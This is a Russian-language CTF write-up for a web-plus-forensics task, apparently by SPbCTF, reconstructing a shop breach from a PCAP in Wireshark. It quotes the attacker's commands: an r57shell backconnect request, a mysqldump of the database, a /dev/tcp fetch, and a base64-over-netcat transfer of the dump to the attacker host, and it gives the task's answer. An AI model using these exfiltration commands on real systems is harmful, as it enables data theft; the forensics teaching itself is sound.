# Задание Web+Forensics для балакавров

> Наш магазин взломали и украли базу! 
> К счастью, похоже, что атака была записана сетевым сенсором: https://.../attack_trace.pcap
> 
> Проверьте наши подозрения, и в качестве доказательства предоставьте пароль пользователя VladRoskov37


## Осматриваемся

Нам дан файл attack_trace.pcap — это формат записи трафика PCAP, который умеют открывать инструменты для работы с трафиком. Мы будем использовать Wireshark.

Для того чтобы осмотреться в дампе трафика, удобно использовать статистику подключений: Statistics → Conversations. В дампе есть трафик только между 192.168.192.1 и 192.168.192.64:  
− 25 сессий на 192.168.192.64 порт 80/tcp (HTTP) — обращения к веб-сайту на сервере 192.168.192.64  
− Три обратные сессии с 192.168.192.64 на 192.168.192.1 порты 11457/tcp (долгоживущее подключение, 386 сек), 7777/tcp и 7878/tcp

Вначале проанализируем HTTP-трафик. Для этого в главном списке пакетов применим фильтр `http` и пролистаем запросы. После обычного обращения к сайту, злоумышленник находит веб-шелл r57shell по адресу `/source/bootstrap-3.3.6-dist/_PWNED_LOL/r57shell.php` и подбирает пароль к нему: `r57 / r57`. Далее злоумышленник пользуется r57shell, и в пакете №1843 посылает запрос на поднятие backconnect shell:  
`ip=192.168.192.1&port=11457&use=Perl&dir=%2Fvar%2Fwww%2Fhtml&submit=%D0%92%D1%8B%D0%BF%D0%BE%D0%BB%D0%BD%D0%B8%D1%82%D1%8C`  
Эта функция веб-шелла подключится к хосту 192.168.192.1 на порт 11457 и запустит в этом подключении интерпретатор /bin/sh. 


## Анализируем сессию шелла

Дальнейшее управление взломанным сервером ведётся в подключении на 192.168.192.1:11457, поэтому найдём это подключение и посмотрим на его содержимое, нажав Follow Stream.

Важные команды, которые делает злоумышленник:
− Находит логин и пароль от базы данных:
```php
cat config.php
<?php
$DB = mysqli_connect("localhost", "shop", "DBPW1881818_shop", "shop");
?>
```

− Выводит список таблиц в базе:
```sh
mysql -ushop -pDBPW1881818_shop shop -e "show tables"
Tables_in_shop
cards
news
users
```

− Снимает полный дамп базы в файл /tmp/dump.sql:
```sh
mysqldump -ushop -pDBPW1881818_shop shop > /tmp/dump.sql
```

− Запрашивает пароль для архива, подключаясь на 192.168.192.1:7777 и декодируя его из хексов, и архивирует дамп с этим паролем:
```sh
pass=`xxd -ps -r </dev/tcp/192.168.192.1/7777`
rar m -hp$pass /tmp/dump.rar /tmp/dump.sql
```

− Посылает закодированный в base64 архив на 192.168.192.1:7878
```sh
base64 /tmp/dump.rar | nc 192.168.192.1 7878
```


## Извлекаем данные БД

Во-первых, нам требуется пароль от архива. Его злоумышленник получил с порта 7777, поэтому посмотрим данные сессии на этот порт:
```
42643432384a474e545a444155386a314a463865
```

Пароль раскодируется из хексов, поэтому настоящий пароль от архива:
```python
In [1]: print "42643432384a474e545a444155386a314a463865".decode('hex')
Bd428JGNTZDAU8j1JF8e
```

Во-вторых, извлечём сам архив. Подключение на порт 7878 содержит много данных в base64, сделаем Save as, чтобы сохранить их в файл.  
Раскодируем base64:
```python
In [2]: open("arch.rar", "wb").write(base64.b64decode(open("arch.rar.b64").read()))
```
На винде важно использовать режим `"wb"`, чтобы в архиве не побились байты `\n`, заменившись на `\r\n`.

Этот архив распакуем с паролем `Bd428JGNTZDAU8j1JF8e`, используя 7-zip или WinRAR. Если на вашей системе архиватор не мог распаковать этот архив (RAR версии 5), и вам не дали скачать новый архиватор, подайте апелляцию.

В файле dump.sql, извлечённом из архива, ищем учётную запись пользователя VladRoskov37:
```sql
(4,'vos@vos.uz','VladRoskov37','0h_NO_1_H4ve_B3eN_PWn3D',99,'Vlad','Roskov',1548760464,'127.0.0.2')
```
Из запроса `` CREATE TABLE `users` `` узнаём названия колонок этой таблицы:
```
id    email         login              password       priv firstname lastname lastlogin  loginip
```

Пароль пользователя VladRoskov37, который просят в задании: **0h_NO_1_H4ve_B3eN_PWn3D**

Задание подготовлено сообществом SPbCTF ([vk.com/spbctf](https://vk.com/spbctf), Telegram: [@spbctf](https://t-do.ru/spbctf))
